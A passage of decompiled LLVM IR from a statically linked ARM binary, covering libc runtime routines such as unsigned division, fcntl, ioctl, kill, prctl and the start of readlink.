  %v1_106d0 = phi i32 [ %v4_106d0, %.thread11 ], [ %v1_1069851, %dec_label_pc_10694 ]
  %v1_1069c = phi i32 [ %v0_106c8, %.thread11 ], [ %v0_1064c, %dec_label_pc_10694 ]
  %v3_10698 = icmp ult i32 %v1_1069c, %v1_106d0
  br i1 %v3_10698, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10698
  %v3_1069c = sub i32 %v1_1069c, %v1_106d0
  store i32 %v3_1069c, i32* %r0.global-to-local, align 4
  %v3_106a0 = or i32 %v1_106a0, %v1_106cc
  store i32 %v3_106a0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10698, %bb84
  %v1_106a8 = phi i32 [ %v1_1069c, %dec_label_pc_10698 ], [ %v3_1069c, %bb84 ]
  %v1_106ac = phi i32 [ %v1_106a0, %dec_label_pc_10698 ], [ %v3_106a0, %bb84 ]
  %v4_106a4 = udiv i32 %v1_106d0, 2
  %v6_106a4 = icmp ult i32 %v1_106a8, %v4_106a4
  br i1 %v6_106a4, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_106a8 = urem i32 %v1_106d0, 2
  %v4_106a8 = icmp eq i32 %v3_106a8, 0
  %v6_106a8 = sub i32 %v1_106a8, %v4_106a4
  store i32 %v6_106a8, i32* %r0.global-to-local, align 4
  br i1 %v4_106a8, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_106ac = udiv i32 %v1_106cc, 2
  %v6_106ac = or i32 %v1_106ac, %v5_106ac
  store i32 %v6_106ac, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_106b4 = phi i32 [ %v6_106a8, %bb85 ], [ %v1_106a8, %.thread7 ], [ %v6_106a8, %bb86 ]
  %v1_106b8 = phi i32 [ %v1_106ac, %bb85 ], [ %v1_106ac, %.thread7 ], [ %v6_106ac, %bb86 ]
  %v4_106b0 = udiv i32 %v1_106d0, 4
  %v6_106b0 = icmp ult i32 %v1_106b4, %v4_106b0
  br i1 %v6_106b0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_106b4 = and i32 %v1_106d0, 2
  %v4_106b4 = icmp eq i32 %v3_106b4, 0
  %v6_106b4 = sub i32 %v1_106b4, %v4_106b0
  store i32 %v6_106b4, i32* %r0.global-to-local, align 4
  br i1 %v4_106b4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_106b8 = udiv i32 %v1_106cc, 4
  %v6_106b8 = or i32 %v1_106b8, %v5_106b8
  store i32 %v6_106b8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_106c0 = phi i32 [ %v6_106b4, %bb87 ], [ %v1_106b4, %.thread8 ], [ %v6_106b4, %bb88 ]
  %v1_106c4 = phi i32 [ %v1_106b8, %bb87 ], [ %v1_106b8, %.thread8 ], [ %v6_106b8, %bb88 ]
  %v4_106bc = udiv i32 %v1_106d0, 8
  %v6_106bc = icmp ult i32 %v1_106c0, %v4_106bc
  br i1 %v6_106bc, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_106c0 = and i32 %v1_106d0, 4
  %v4_106c0 = icmp eq i32 %v3_106c0, 0
  %v6_106c0 = sub i32 %v1_106c0, %v4_106bc
  store i32 %v6_106c0, i32* %r0.global-to-local, align 4
  br i1 %v4_106c0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_106c4 = udiv i32 %v1_106cc, 8
  %v6_106c4 = or i32 %v1_106c4, %v5_106c4
  store i32 %v6_106c4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_106d8 = phi i32 [ %v1_106c4, %bb89 ], [ %v1_106c4, %.thread9 ], [ %v6_106c4, %bb90 ]
  %v0_106c8 = phi i32 [ %v6_106c0, %bb89 ], [ %v1_106c0, %.thread9 ], [ %v6_106c0, %bb90 ]
  %v2_106c8 = icmp eq i32 %v0_106c8, 0
  br i1 %v2_106c8, label %dec_label_pc_106d8, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_106cc, 16
  br i1 %tmp138, label %dec_label_pc_106d8, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_106cc = udiv i32 %v1_106cc, 16
  %v4_106d0 = udiv i32 %v1_106d0, 16
  br label %dec_label_pc_10698

dec_label_pc_106d8:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_106d8, i32* %r0.global-to-local, align 4
  ret i32 %v0_106d8

dec_label_pc_106e0:                               ; preds = %dec_label_pc_1064c
  %v9_1064c = icmp eq i32 %v0_1064c, %v1_1064c
  %. = zext i1 %v9_1064c to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_106ec:                               ; preds = %dec_label_pc_10654
  %v2_106ec = icmp ugt i32 %v1_1064c, 65535
  br i1 %v2_106ec, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_106ec
  %v2_106f0 = and i32 %v1_1064c, 32768
  %v3_106f0 = icmp eq i32 %v2_106f0, 0
  %v4_106f0 = udiv i32 %v1_1064c, 65536
  br i1 %v3_106f0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_106ec
  %v0_106fc65 = phi i32 [ %v1_1064c, %dec_label_pc_106ec ], [ %v4_106f0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10700 = phi i32 [ %v0_106fc65, %.thread16 ], [ %v4_106f0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_106fc = icmp ugt i32 %v1_10700, 255
  br i1 %v2_106fc, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10700 = and i32 %v1_10700, 128
  %v3_10700 = icmp eq i32 %v2_10700, 0
  %v4_10700 = udiv i32 %v1_10700, 256
  br i1 %v3_10700, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10704 = or i32 %storemerge, 8
  store i32 %v2_10704, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10710 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10704, %bb98 ]
  %v1_1070c = phi i32 [ %v1_10700, %bb96 ], [ %v4_10700, %bb97 ], [ %v4_10700, %bb98 ]
  %v2_10708 = icmp ugt i32 %v1_1070c, 15
  br i1 %v2_10708, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_1070c = and i32 %v1_1070c, 8
  %v3_1070c = icmp eq i32 %v2_1070c, 0
  %v4_1070c = udiv i32 %v1_1070c, 16
  br i1 %v3_1070c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10710 = add nsw i32 %v1_10710, 4
  store i32 %v2_10710, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10718 = phi i32 [ %v1_10710, %.thread17 ], [ %v1_10710, %bb99 ], [ %v2_10710, %bb100 ]
  %v5_1071c = phi i32 [ %v1_1070c, %.thread17 ], [ %v4_1070c, %bb99 ], [ %v4_1070c, %bb100 ]
  %v2_10714 = icmp ugt i32 %v5_1071c, 3
  %v7_10714 = icmp eq i32 %v5_1071c, 4
  %v2_10718 = xor i1 %v7_10714, true
  %v3_10718 = and i1 %v2_10714, %v2_10718
  br i1 %v3_10718, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10718 = add nsw i32 %v4_10718, 3
  store i32 %v5_10718, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_1071c = phi i32 [ %v4_10718, %.thread18 ], [ %v5_10718, %bb101 ]
  %v2_1071c = xor i1 %v2_10714, true
  %v3_1071c = or i1 %v7_10714, %v2_1071c
  br i1 %v3_1071c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_1071c = udiv i32 %v5_1071c, 2
  %v9_1071c = add i32 %v4_1071c, %v8_1071c
  store i32 %v9_1071c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10720 = phi i32 [ %v4_1071c, %bb102 ], [ %v9_1071c, %bb103 ]
  %v6_10720 = lshr i32 %v0_1064c, %v1_10720
  store i32 %v6_10720, i32* %r0.global-to-local, align 4
  ret i32 %v6_10720

dec_label_pc_10728:                               ; preds = %entry
  %v0_1072c = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1071c, { 1, 0 }
  uselistorder i1 %v7_10714, { 1, 0 }
  uselistorder i32 %v4_1070c, { 1, 0 }
  uselistorder i32 %v1_1070c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10704, { 1, 0 }
  uselistorder i32 %v4_10700, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10700, { 1, 0, 2, 3 }
  uselistorder i32 %v4_106f0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_106c8, { 1, 0 }
  uselistorder i32 %v0_106d8, { 1, 0, 2 }
  uselistorder i32 %v4_106bc, { 1, 0 }
  uselistorder i32 %v1_106c4, { 1, 2, 0 }
  uselistorder i32 %v4_106b0, { 1, 0 }
  uselistorder i32 %v1_106b8, { 1, 2, 0 }
  uselistorder i32 %v4_106a4, { 1, 0 }
  uselistorder i32 %v1_106ac, { 1, 2, 0 }
  uselistorder i32 %v1_106d0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_106a0, { 1, 0 }
  uselistorder i32 %v1_106cc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1068c, { 1, 0 }
  uselistorder i32 %v3_10688, { 1, 0 }
  uselistorder i32 %v1_10688, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1068c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10678, { 1, 0 }
  uselistorder i32 %v4_10674, { 2, 1, 0 }
  uselistorder i32 %v1_10678, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10680.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_1064c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_1064c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10640, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_106d8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10694, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10680thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10740 = udiv i32 %arg1, %arg2
  ret i32 %v2_10740
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_1075c = call i32 @__GI_raise(i32 8)
  ret i32 %v1_1075c
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_10778 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_10778, 2
  br i1 %tmp, label %dec_label_pc_107b4, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_107e8, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10790
  %v0_107a8 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_107dc

dec_label_pc_107b4:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_107d0, label %dec_label_pc_107e8

dec_label_pc_107d0:                               ; preds = %dec_label_pc_107b4
  %v0_107d4 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107a4, %dec_label_pc_107d0
  %storemerge2 = phi i32 [ %v0_107a8, %dec_label_pc_107a4 ], [ %v0_107d4, %dec_label_pc_107d0 ]
  %storemerge.in = load i16, i16* @global_var_216f0.341, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_107dc = load i32, i32* %r2.global-to-local, align 4
  %v1_107dc = sub i32 0, %v0_107dc
  store i32 %v1_107dc, i32* %r2.global-to-local, align 4
  %v3_107e0 = add i32 %storemerge, %storemerge2
  %v4_107e0 = inttoptr i32 %v3_107e0 to i32*
  store i32 %v1_107dc, i32* %v4_107e0, align 4
  br label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %dec_label_pc_10790, %dec_label_pc_107b4, %dec_label_pc_107dc
  %storemerge1 = phi i32 [ -1, %dec_label_pc_107dc ], [ %arg1, %dec_label_pc_107b4 ], [ %arg1, %dec_label_pc_10790 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_107e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107dc, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10800 = load i32, i32* @r2, align 4
  %v9_10800 = load i32, i32* @r3, align 4
  store i32 %v9_10800, i32* %stack_var_-4, align 4
  %v3_10804 = load i32, i32* @r4, align 4
  store i32 %v3_10804, i32* %stack_var_-32, align 4
  %v6_10804 = load i32, i32* @r5, align 4
  %v12_10804 = load i32, i32* @r7, align 4
  %v4_10814 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_1081c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1081c, i32* @r3, align 4
  %v2_10820 = icmp eq i32 %v4_10814, 0
  %v0_10828 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10828, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_10800, i32* @r4, align 4
  br i1 %v2_10820, label %dec_label_pc_10844, label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %entry
  %v7_10838 = icmp eq i32 %arg2, 7
  br i1 %v7_10838, label %dec_label_pc_10884, label %bb

bb:                                               ; preds = %dec_label_pc_10838
  %v8_1083c = icmp eq i32 %arg2, 14
  br i1 %v8_1083c, label %dec_label_pc_10884, label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10828, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10828, -4095
  br i1 %tmp, label %dec_label_pc_1087c, label %dec_label_pc_10864

dec_label_pc_10864:                               ; preds = %dec_label_pc_10844
  %v0_10868 = call i32 @__aeabi_read_tp()
  %v3_1086c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1086c = sext i16 %v3_1086c to i32
  store i32 %v4_1086c, i32* @r3, align 4
  %v0_10870 = load i32, i32* @r2, align 4
  %v1_10870 = sub i32 0, %v0_10870
  store i32 %v1_10870, i32* @r2, align 4
  %v3_10874 = add i32 %v4_1086c, %v0_10868
  %v4_10874 = inttoptr i32 %v3_10874 to i32*
  store i32 %v1_10870, i32* %v4_10874, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_10844, %dec_label_pc_10864
  %v0_1087c = phi i32 [ %v0_10828, %dec_label_pc_10844 ], [ -1, %dec_label_pc_10864 ]
  br label %dec_label_pc_108d0

dec_label_pc_10884:                               ; preds = %dec_label_pc_10838, %bb
  %v0_10884 = call i32 @__libc_enable_asynccancel()
  %v0_10888 = load i32, i32* @r7, align 4
  store i32 %v0_10888, i32* @r1, align 4
  store i32 %v0_10884, i32* %r6.global-to-local, align 4
  %v0_10894 = load i32, i32* @r5, align 4
  store i32 %v0_10894, i32* %r0.global-to-local, align 4
  store i32 %v0_10894, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_10894, -4095
  br i1 %tmp15, label %dec_label_pc_108c4, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %dec_label_pc_10884
  %v1_108b0 = sub i32 0, %v0_10894
  %v0_108b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_108b4, i32* %r0.global-to-local, align 4
  %v3_108b8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_108b8 = sext i16 %v3_108b8 to i32
  store i32 %v4_108b8, i32* @r3, align 4
  %v3_108bc = add i32 %v4_108b8, %v0_108b4
  %v4_108bc = inttoptr i32 %v3_108bc to i32*
  store i32 %v1_108b0, i32* %v4_108bc, align 4
  store i32 -1, i32* @r2, align 4
  %v0_108c4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_10884, %dec_label_pc_108ac
  %v0_108c8 = phi i32 [ %v0_10894, %dec_label_pc_10884 ], [ -1, %dec_label_pc_108ac ]
  %v0_108c4 = phi i32 [ %v0_10884, %dec_label_pc_10884 ], [ %v0_108c4.pre, %dec_label_pc_108ac ]
  store i32 %v0_108c4, i32* %r0.global-to-local, align 4
  store i32 %v0_108c8, i32* @r7, align 4
  %v1_108cc = call i32 @__libc_disable_asynccancel(i32 %v0_108c4)
  store i32 %v1_108cc, i32* %r0.global-to-local, align 4
  %v0_108d0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_108d0

dec_label_pc_108d0:                               ; preds = %dec_label_pc_1087c, %dec_label_pc_108c4
  %v0_108d0 = phi i32 [ %v0_1087c, %dec_label_pc_1087c ], [ %v0_108d0.pre, %dec_label_pc_108c4 ]
  store i32 %v0_108d0, i32* %r0.global-to-local, align 4
  %v2_108d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_108d8, i32* @r4, align 4
  store i32 %v6_10804, i32* @r5, align 4
  store i32 %v12_10804, i32* @r7, align 4
  ret i32 %v0_108d0

; uselistorder directives
  uselistorder i32 %v0_108d0, { 1, 0 }
  uselistorder i32 %v0_108c4, { 1, 0 }
  uselistorder i32 %v0_10894, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10828, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_108d0, { 1, 0 }
  uselistorder label %dec_label_pc_108c4, { 1, 0 }
  uselistorder label %dec_label_pc_10884, { 1, 0 }
  uselistorder label %dec_label_pc_1087c, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10904 = load i32, i32* @r0, align 4
  ret i32 %v1_10904
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10908 = load i32, i32* @r3, align 4
  store i32 %v9_10908, i32* %stack_var_-4, align 4
  %v3_1090c = load i32, i32* @r4, align 4
  store i32 %v3_1090c, i32* %stack_var_-32, align 4
  %v6_1090c = load i32, i32* @r5, align 4
  %v12_1090c = load i32, i32* @r7, align 4
  %v4_1091c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_10924 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10924, i32* @r3, align 4
  %v2_10928 = icmp eq i32 %v4_1091c, 0
  %v0_10930 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10930, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_10928, label %dec_label_pc_10940, label %dec_label_pc_10978

dec_label_pc_10940:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_10930, -4095
  br i1 %tmp, label %dec_label_pc_10970, label %dec_label_pc_10958

dec_label_pc_10958:                               ; preds = %dec_label_pc_10940
  %v1_1095c = sub i32 0, %v0_10930
  %v3_10960 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10960 = sext i16 %v3_10960 to i32
  store i32 %v4_10960, i32* @r3, align 4
  %v0_10964 = call i32 @__aeabi_read_tp()
  %v2_10968 = load i32, i32* @r3, align 4
  %v3_10968 = add i32 %v2_10968, %v0_10964
  %v4_10968 = inttoptr i32 %v3_10968 to i32*
  store i32 %v1_1095c, i32* %v4_10968, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10970

dec_label_pc_10970:                               ; preds = %dec_label_pc_10940, %dec_label_pc_10958
  %v0_10970 = phi i32 [ %v0_10930, %dec_label_pc_10940 ], [ -1, %dec_label_pc_10958 ]
  br label %dec_label_pc_109c4

dec_label_pc_10978:                               ; preds = %entry
  %v0_10978 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10978, i32* %r6.global-to-local, align 4
  %v0_10988 = load i32, i32* @r4, align 4
  store i32 %v0_10988, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10988, -4095
  br i1 %tmp15, label %dec_label_pc_109b8, label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %dec_label_pc_10978
  %v1_109a4 = sub i32 0, %v0_10988
  %v3_109a8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_109a8 = sext i16 %v3_109a8 to i32
  store i32 %v4_109a8, i32* @r3, align 4
  %v0_109ac = call i32 @__aeabi_read_tp()
  store i32 %v0_109ac, i32* %r0.global-to-local, align 4
  %v2_109b0 = load i32, i32* @r3, align 4
  %v3_109b0 = add i32 %v2_109b0, %v0_109ac
  %v4_109b0 = inttoptr i32 %v3_109b0 to i32*
  store i32 %v1_109a4, i32* %v4_109b0, align 4
  %v0_109b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_109b8

dec_label_pc_109b8:                               ; preds = %dec_label_pc_10978, %dec_label_pc_109a0
  %v0_109bc = phi i32 [ %v0_10988, %dec_label_pc_10978 ], [ -1, %dec_label_pc_109a0 ]
  %v0_109b8 = phi i32 [ %v0_10978, %dec_label_pc_10978 ], [ %v0_109b8.pre, %dec_label_pc_109a0 ]
  store i32 %v0_109b8, i32* %r0.global-to-local, align 4
  store i32 %v0_109bc, i32* @r7, align 4
  %v1_109c0 = call i32 @__libc_disable_asynccancel(i32 %v0_109b8)
  store i32 %v1_109c0, i32* %r0.global-to-local, align 4
  %v0_109c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_10970, %dec_label_pc_109b8
  %v0_109c4 = phi i32 [ %v0_10970, %dec_label_pc_10970 ], [ %v0_109c4.pre, %dec_label_pc_109b8 ]
  store i32 %v0_109c4, i32* %r0.global-to-local, align 4
  %v2_109cc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_109cc, i32* @r4, align 4
  store i32 %v6_1090c, i32* @r5, align 4
  store i32 %v12_1090c, i32* @r7, align 4
  ret i32 %v0_109c4

; uselistorder directives
  uselistorder i32 %v0_109c4, { 1, 0 }
  uselistorder i32 %v0_109b8, { 1, 0 }
  uselistorder i32 %v0_10988, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10930, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_109c4, { 1, 0 }
  uselistorder label %dec_label_pc_109b8, { 1, 0 }
  uselistorder label %dec_label_pc_10970, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109e8 = load i32, i32* @r7, align 4
  store i32 %v3_109e8, i32* %stack_var_-8, align 4
  %v0_109f4 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109f4, -4095
  br i1 %tmp, label %dec_label_pc_10a14, label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %entry
  %v1_10a00 = sub i32 0, %v0_109f4
  %v3_10a04 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10a04 = sext i16 %v3_10a04 to i32
  %v0_10a08 = call i32 @__aeabi_read_tp()
  %v3_10a0c = add i32 %v4_10a04, %v0_10a08
  %v4_10a0c = inttoptr i32 %v3_10a0c to i32*
  store i32 %v1_10a00, i32* %v4_10a0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10a14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %entry, %dec_label_pc_109fc
  %v1_10a18 = phi i32 [ %v0_109f4, %entry ], [ -1, %dec_label_pc_109fc ]
  %v2_10a14 = phi i32 [ %v3_109e8, %entry ], [ %v2_10a14.pre, %dec_label_pc_109fc ]
  store i32 %v2_10a14, i32* @r7, align 4
  ret i32 %v1_10a18

; uselistorder directives
  uselistorder i32 %v0_109f4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a14, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10a20 = load i32, i32* @r4, align 4
  store i32 %v3_10a20, i32* %stack_var_-12, align 4
  %v0_10a30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a30, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10a30, -4095
  br i1 %tmp, label %dec_label_pc_10a58, label %dec_label_pc_10a40

dec_label_pc_10a40:                               ; preds = %entry
  %v0_10a44 = call i32 @__aeabi_read_tp()
  %v3_10a48 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10a48 = sext i16 %v3_10a48 to i32
  %v0_10a4c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a4c = sub i32 0, %v0_10a4c
  store i32 %v1_10a4c, i32* %r2.global-to-local, align 4
  %v3_10a50 = add i32 %v4_10a48, %v0_10a44
  %v4_10a50 = inttoptr i32 %v3_10a50 to i32*
  store i32 %v1_10a4c, i32* %v4_10a50, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10a58.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10a58

dec_label_pc_10a58:                               ; preds = %entry, %dec_label_pc_10a40
  %v1_10a5c = phi i32 [ %v0_10a30, %entry ], [ -1, %dec_label_pc_10a40 ]
  %v2_10a58 = phi i32 [ %v3_10a20, %entry ], [ %v2_10a58.pre, %dec_label_pc_10a40 ]
  store i32 %v2_10a58, i32* @r4, align 4
  ret i32 %v1_10a5c

; uselistorder directives
  uselistorder i32 %v0_10a30, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a58, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
